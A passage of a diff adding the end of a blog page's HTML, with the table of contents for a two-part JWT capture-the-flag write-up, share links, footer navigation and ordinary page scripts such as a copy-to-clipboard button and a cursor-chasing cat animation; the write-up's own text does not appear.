+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JWT-1"><span class="toc-number">1.</span> <span class="toc-text">JWT-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-what-a-JWT-is"><span class="toc-number">1.2.</span> <span class="toc-text">Understanding what a JWT is</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attempts"><span class="toc-number">1.3.</span> <span class="toc-text">Attempts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-there%E2%80%A6"><span class="toc-number">1.4.</span> <span class="toc-text">Getting there…</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.5.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JWT-2"><span class="toc-number">2.</span> <span class="toc-text">JWT-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info-1"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">2.2.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trying-the-first-solution"><span class="toc-number">2.3.</span> <span class="toc-text">Trying the first solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Inspecting-the-attached-TypeScript-file"><span class="toc-number">2.4.</span> <span class="toc-text">Inspecting the attached TypeScript file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.5.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/jwt/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/jwt/&text=JWT"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/jwt/&is_video=false&description=JWT"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JWT&body=Check out this article: https://rivers.sh/posts/jwt/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/jwt/&name=JWT&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/jwt/&t=JWT"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    Rivers
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+    <!-- Add Oneko.js Script -->
+    <script src="/js/oneko.js"></script>
+    <script>
+      window.onload = function() {
+        oneko('/images/oneko.gif'); // This starts the cat chasing the mouse
+      };
+    </script>
+</body>
+</html>
